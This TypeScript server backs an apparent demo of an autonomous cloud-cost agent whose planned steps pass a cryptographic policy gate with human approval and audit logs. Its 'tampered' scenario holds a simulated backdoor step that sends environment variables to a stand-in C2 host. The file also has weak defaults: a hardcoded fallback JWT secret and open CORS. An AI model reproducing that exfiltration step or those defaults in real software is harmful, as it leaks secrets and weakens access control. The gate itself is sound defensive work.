import express from 'express';
import http from 'http';
import { Server as SocketIOServer } from 'socket.io';
import path from 'path';
import jwt from 'jsonwebtoken';
import dotenv from 'dotenv';
import crypto from 'crypto';
import { createServer as createViteServer } from 'vite';

import { db } from './src/server/db';
import { ArmorIQClient } from './src/server/armoriq';
import { PlanStep, FinOpsRun, CloudResource } from './src/types';

dotenv.config();

const app = express();
const server = http.createServer(app);
const io = new SocketIOServer(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

const PORT = 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'ghost_cfo_super_secure_key_2026';
const armoriq = new ArmorIQClient();

app.use(express.json());

// Track currently active background execution intervals or timeouts
const activeIntervals = new Map<string, NodeJS.Timeout>();

// JWT Authentication Middleware
const authenticateToken = (req: any, res: any, next: any) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Authentication token missing' });
  }

  jwt.verify(token, JWT_SECRET, (err: any, decoded: any) => {
    if (err) {
      return res.status(403).json({ error: 'Token is invalid or expired' });
    }
    req.user = decoded;
    next();
  });
};

// ==========================================
// 1. Authentication & Scaffolding Routes
// ==========================================

app.post('/api/auth/register', (req, res) => {
  const { name, email, password, orgName } = req.body;
  if (!name || !email || !password || !orgName) {
    return res.status(400).json({ error: 'All fields are required' });
  }

  try {
    const { user, org } = db.registerUser(name, email, password, orgName);
    const token = jwt.sign({ id: user.id, email: user.email, orgId: user.orgId }, JWT_SECRET, { expiresIn: '7d' });
    res.json({ token, user, org });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  const user = db.getUserByEmail(email);
  if (!user || !db.verifyPassword(email, password)) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  const org = db.getOrg(user.orgId);
  const token = jwt.sign({ id: user.id, email: user.email, orgId: user.orgId }, JWT_SECRET, { expiresIn: '7d' });
  res.json({ token, user, org });
});

app.get('/api/auth/me', authenticateToken, (req: any, res) => {
  const user = db.getUserByEmail(req.user.email);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  const org = db.getOrg(user.orgId);
  res.json({ user, org }); // DTO safely excludes any passwordHash/sensitive fields
});

// ==========================================
// 2. Cloud Fleet Inventory Routes
// ==========================================

app.get('/api/resources', authenticateToken, (req, res) => {
  res.json(db.getResources());
});

app.post('/api/resources/reset', authenticateToken, (req: any, res) => {
  db.resetResources();
  io.to(`org:${req.user.orgId}`).emit('resources:reset', db.getResources());
  res.json({ message: 'Cloud resource fleet has been restored to default seed state.', resources: db.getResources() });
});

// ==========================================
// 3. FinOps Runs & Agent Loop Routes
// ==========================================

app.get('/api/runs', authenticateToken, (req, res) => {
  res.json(db.getRuns());
});

app.get('/api/runs/:id', authenticateToken, (req, res) => {
  const run = db.getRun(req.params.id);
  if (!run) {
    return res.status(404).json({ error: 'Execution run not found' });
  }
  res.json(run);
});

// Plan Generator based on scenario type
function generatePlanSteps(type: 'compliant' | 'policy_violation' | 'tampered'): PlanStep[] {
  const basicSteps: PlanStep[] = [
    {
      id: 'step-1',
      action: 'list_instances',
      mcp: 'mcp-aws-compute',
      params: {},
      status: 'pending'
    },
    {
      id: 'step-2',
      action: 'analyze_utilization',
      mcp: 'mcp-aws-compute',
      params: {},
      status: 'pending'
    }
  ];

  if (type === 'compliant') {
    return [
      ...basicSteps,
      {
        id: 'step-3',
        action: 'terminate_instance',
        mcp: 'mcp-aws-compute',
        params: { resourceId: 'res-ec2-dev-sandbox-01', tags: { environment: 'dev', owner: 'qa-sandbox' } },
        status: 'pending'
      },
      {
        id: 'step-4',
        action: 'generate_report',
        mcp: 'mcp-finops-reporter',
        params: { outputFormat: 'json', destination: 'slack-finops-channel' },
        status: 'pending'
      }
    ];
  } else if (type === 'policy_violation') {
    return [
      ...basicSteps,
      {
        id: 'step-3',
        action: 'terminate_instance',
        mcp: 'mcp-aws-compute',
        params: { resourceId: 'res-ec2-dev-sandbox-01', tags: { environment: 'dev', owner: 'qa-sandbox' } },
        status: 'pending'
      },
      {
        id: 'step-4',
        action: 'delete_volume', // OUT OF SCOPE: Gated by ArmorIQ Policy
        mcp: 'mcp-aws-storage',
        params: { resourceId: 'res-ebs-staging-unused', tags: { environment: 'staging', type: 'gp3' } },
        status: 'pending'
      },
      {
        id: 'step-5',
        action: 'generate_report',
        mcp: 'mcp-finops-reporter',
        params: { outputFormat: 'json' },
        status: 'pending'
      }
    ];
  } else {
    // Tampered
    return [
      ...basicSteps,
      {
        id: 'step-3',
        action: 'custom_malicious_action', // Completely unauthorized tool invocation!
        mcp: 'mcp-backdoor-service',
        params: { payload: 'exfiltrate-environment-variables', targetUrl: 'http://malicious-c2.example.com/leak' },
        status: 'pending'
      },
      {
        id: 'step-4',
        action: 'generate_report',
        mcp: 'mcp-finops-reporter',
        params: {},
        status: 'pending'
      }
    ];
  }
}

// core autonomous FinOps Agent execution loop
async function runExecutionLoop(runId: string, userEmail: string, orgId: string) {
  const run = db.getRun(runId);
  if (!run || run.status === 'completed' || run.status === 'failed') return;

  const orgRoom = `org:${orgId}`;
  run.status = 'running';
  db.saveRun(run);
  io.to(orgRoom).emit('run:updated', run);

  const scope = armoriq.forUser(userEmail);

  while (run.currentStepIndex < run.steps.length) {
    const step = run.steps[run.currentStepIndex];
    step.status = 'running';
    db.saveRun(run);
    io.to(orgRoom).emit('step:running', { runId, step });

    // Wait 1.5 seconds to simulate agent deliberation and cloud processing
    await new Promise(resolve => setTimeout(resolve, 1500));

    // Verify step invocation through ArmorIQ Gate
    const token = `armoriq_intent_token_${crypto.createHash('sha256')
      .update(run.planHash + userEmail + 'armoriq_entropy')
      .digest('hex')
      .substring(0, 16)}`;

    // Invoke ArmorIQ SDK Cryptographic Verification
    const response = await scope.invoke(step.mcp, step.action, token, step.params, run.planHash);

    if (response.status === 'allowed') {
      // Step verified. Proceed with real-time FinOps Cloud Action execution.
      step.status = 'allowed';
      db.saveRun(run);

      // Mutate local state based on action to reflect real system change
      if (step.action === 'terminate_instance') {
        const rId = step.params.resourceId;
        db.updateResourceStatus(rId, 'terminated');
        io.to(orgRoom).emit('resources:updated', db.getResources());
      } else if (step.action === 'delete_volume') {
        const rId = step.params.resourceId;
        db.deleteResource(rId);
        io.to(orgRoom).emit('resources:updated', db.getResources());
      }

      // Log in Audit Trail
      db.logAudit({
        action: step.action,
        mcp: step.mcp,
        planHash: run.planHash,
        stepProof: run.stepProof,
        decision: 'allowed',
        reason: 'ArmorIQ verified action against the sealed cryptographic plan.',
        userEmail,
        runId
      });

      io.to(orgRoom).emit('step:allowed', { runId, step, auditLogs: db.getAuditLogs() });
      run.currentStepIndex++;
    } else if (response.status === 'held') {
      // Suspended by ArmorIQ Policy Gates!
      step.status = 'held';
      step.holdReason = response.reason;
      run.status = 'paused';
      db.saveRun(run);

      db.logAudit({
        action: step.action,
        mcp: step.mcp,
        planHash: run.planHash,
        stepProof: run.stepProof,
        decision: 'held',
        reason: response.reason || 'Action suspended. Requires supervisor approval.',
        userEmail,
        runId
      });

      io.to(orgRoom).emit('step:held', { runId, step, auditLogs: db.getAuditLogs() });
      io.to(orgRoom).emit('run:updated', run);
      return; // Stop the execution loop completely!
    } else if (response.status === 'blocked') {
      // High-gravity structural policy rejection or Tampering detection
      step.status = 'failed';
      step.holdReason = response.reason;
      run.status = 'failed';
      db.saveRun(run);

      db.logAudit({
        action: step.action,
        mcp: step.mcp,
        planHash: run.planHash,
        stepProof: run.stepProof,
        decision: 'blocked',
        reason: response.reason || 'Block enforced by cryptographic gate.',
        userEmail,
        runId
      });

      io.to(orgRoom).emit('step:blocked', { runId, step, auditLogs: db.getAuditLogs() });
      io.to(orgRoom).emit('run:updated', run);
      return; // End execution run with complete termination
    }
  }

  // If we made it here, all steps passed
  run.status = 'completed';
  db.saveRun(run);
  io.to(orgRoom).emit('run:updated', run);
}

// Create a new FinOps Run
app.post('/api/runs', authenticateToken, async (req: any, res) => {
  const { type } = req.body; // 'compliant' | 'policy_violation' | 'tampered'
  const userEmail = req.user.email;
  const orgId = req.user.orgId;

  if (!type || !['compliant', 'policy_violation', 'tampered'].includes(type)) {
    return res.status(400).json({ error: 'Invalid run scenario type' });
  }

  const goal = type === 'compliant' 
    ? 'Enumerate assets and terminate idle sandbox resources' 
    : type === 'policy_violation' 
      ? 'Perform cloud-wide FinOps pruning including volume purging' 
      : 'Analyze fleet nodes then trigger custom network telemetry collection';

  const steps = generatePlanSteps(type);

  try {
    // 1. ArmorIQ Plan Capture & Cryptographic Sealing
    const scope = armoriq.forUser(userEmail);
    const captured = await scope.capturePlan('gemini-2.5-flash', goal, { goal, steps });
    const intentToken = await scope.getIntentToken(captured);

    const runId = `run-${crypto.randomBytes(6).toString('hex')}`;
    const run: FinOpsRun = {
      id: runId,
      goal,
      status: 'pending',
      steps,
      planHash: captured.planHash,
      merkleRoot: captured.merkleRoot,
      stepProof: captured.stepProof,
      currentStepIndex: 0,
      createdAt: new Date().toISOString()
    };

    db.saveRun(run);
    io.to(`org:${orgId}`).emit('run:created', run);

    // Fire off execution loop asynchronously in background
    setTimeout(() => {
      runExecutionLoop(runId, userEmail, orgId);
    }, 1000);

    res.json({ message: 'Execution run sealed and launched.', run });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Human Operator Approval
app.post('/api/runs/:id/steps/:stepId/approve', authenticateToken, async (req: any, res) => {
  const { id, stepId } = req.params;
  const run = db.getRun(id);
  const userEmail = req.user.email;
  const orgId = req.user.orgId;

  if (!run) {
    return res.status(404).json({ error: 'Execution run not found' });
  }

  const step = run.steps.find(s => s.id === stepId);
  if (!step) {
    return res.status(404).json({ error: 'Step not found in this run' });
  }

  if (step.status !== 'held') {
    return res.status(400).json({ error: 'Step is not in held status' });
  }

  // Human overrode step. Log manual authorization in ArmorIQ
  step.status = 'approved';
  db.saveRun(run);

  // Execute actual cloud mutation now
  if (step.action === 'terminate_instance') {
    const rId = step.params.resourceId;
    db.updateResourceStatus(rId, 'terminated');
    io.to(`org:${orgId}`).emit('resources:updated', db.getResources());
  } else if (step.action === 'delete_volume') {
    const rId = step.params.resourceId;
    db.deleteResource(rId);
    io.to(`org:${orgId}`).emit('resources:updated', db.getResources());
  }

  db.logAudit({
    action: step.action,
    mcp: step.mcp,
    planHash: run.planHash,
    stepProof: run.stepProof,
    decision: 'approved',
    reason: 'Human Operator authorized override and re-verified step cryptographic checksum.',
    userEmail,
    runId: run.id
  });

  io.to(`org:${orgId}`).emit('step:approved', { runId: run.id, step, auditLogs: db.getAuditLogs() });

  // Move index forward and resume background loop execution
  run.currentStepIndex++;
  run.status = 'running';
  db.saveRun(run);
  io.to(`org:${orgId}`).emit('run:updated', run);

  setTimeout(() => {
    runExecutionLoop(run.id, userEmail, orgId);
  }, 1000);

  res.json({ message: 'Step approved and execution resumed.', run });
});

// Human Operator Rejection
app.post('/api/runs/:id/steps/:stepId/reject', authenticateToken, async (req: any, res) => {
  const { id, stepId } = req.params;
  const run = db.getRun(id);
  const userEmail = req.user.email;
  const orgId = req.user.orgId;

  if (!run) {
    return res.status(404).json({ error: 'Execution run not found' });
  }

  const step = run.steps.find(s => s.id === stepId);
  if (!step) {
    return res.status(404).json({ error: 'Step not found' });
  }

  if (step.status !== 'held') {
    return res.status(400).json({ error: 'Step is not held' });
  }

  step.status = 'rejected';
  run.status = 'failed';
  db.saveRun(run);

  db.logAudit({
    action: step.action,
    mcp: step.mcp,
    planHash: run.planHash,
    stepProof: run.stepProof,
    decision: 'rejected',
    reason: 'Human Operator rejected action invocation. Safe-abort enforced.',
    userEmail,
    runId: run.id
  });

  io.to(`org:${orgId}`).emit('step:rejected', { runId: run.id, step, auditLogs: db.getAuditLogs() });
  io.to(`org:${orgId}`).emit('run:updated', run);

  res.json({ message: 'Step rejected and execution terminated.', run });
});

// Tamper Simulator Endpoint (mismatches token/plan during execution to trigger failure live)
app.post('/api/runs/:id/tamper', authenticateToken, async (req: any, res) => {
  const { id } = req.params;
  const run = db.getRun(id);
  const userEmail = req.user.email;
  const orgId = req.user.orgId;

  if (!run) {
    return res.status(404).json({ error: 'Run not found' });
  }

  if (run.status !== 'running') {
    return res.status(400).json({ error: 'Can only tamper with an active running process' });
  }

  const step = run.steps[run.currentStepIndex];
  if (!step) {
    return res.status(400).json({ error: 'No active step to tamper' });
  }

  // Trigger ArmorIQ rejection by using a randomized fake token
  const tamperedToken = 'armoriq_intent_token_corrupted_payload_8a9c';
  const scope = armoriq.forUser(userEmail);

  step.status = 'running';
  io.to(`org:${orgId}`).emit('step:running', { runId: run.id, step });

  // Call invoke with tampered token to trigger the cryptographic guard
  const response = await scope.invoke(step.mcp, step.action, tamperedToken, step.params, run.planHash);

  if (response.status === 'blocked') {
    step.status = 'failed';
    step.holdReason = response.reason;
    run.status = 'failed';
    db.saveRun(run);

    db.logAudit({
      action: step.action,
      mcp: step.mcp,
      planHash: run.planHash,
      stepProof: run.stepProof,
      decision: 'blocked',
      reason: response.reason || 'Cryptographic tampering detected.',
      userEmail,
      runId: run.id
    });

    io.to(`org:${orgId}`).emit('step:blocked', { runId: run.id, step, auditLogs: db.getAuditLogs() });
    io.to(`org:${orgId}`).emit('run:updated', run);

    return res.json({ message: 'Attack blocked successfully by ArmorIQ cryptographically!', run });
  }

  res.status(500).json({ error: 'Failed to simulate tampering defense' });
});

// ==========================================
// 4. Cryptographic Audit Log Queries
// ==========================================

app.get('/api/audit', authenticateToken, (req, res) => {
  const { action, decision, runId } = req.query;
  let logs = db.getAuditLogs();

  if (action) {
    logs = logs.filter(l => l.action === action);
  }
  if (decision) {
    logs = logs.filter(l => l.decision === decision);
  }
  if (runId) {
    logs = logs.filter(l => l.runId === runId);
  }

  res.json(logs);
});

// ==========================================
// 5. Vite HMR and Static Asset Serving
// ==========================================

async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  // Socket Auth Middleware
  io.use((socket, next) => {
    const token = socket.handshake.auth?.token;
    if (!token) {
      return next(new Error('Authentication token missing'));
    }
    jwt.verify(token, JWT_SECRET, (err: any, decoded: any) => {
      if (err) {
        return next(new Error('Token is invalid or expired'));
      }
      socket.data.user = decoded;
      next();
    });
  });

  // Socket Connection Handlers
  io.on('connection', (socket) => {
    const orgId = socket.data.user?.orgId;
    const orgRoom = `org:${orgId}`;
    socket.join(orgRoom);

    console.log(`Socket client connected: ${socket.id} joined room ${orgRoom}`);
    
    // Send immediate initial data state
    socket.emit('init', {
      resources: db.getResources(),
      runs: db.getRuns(),
      auditLogs: db.getAuditLogs()
    });

    socket.on('disconnect', () => {
      console.log(`Socket client disconnected: ${socket.id}`);
    });
  });

  server.listen(PORT, '0.0.0.0', () => {
    console.log(`==================================================`);
    console.log(`  GHOST CFO BACKEND SERVER ACTIVE`);
    console.log(`  Running live on http://0.0.0.0:${PORT}`);
    console.log(`  Zero-Trust FinOps cryptographic gateway online`);
    console.log(`==================================================`);
  });
}

startServer();
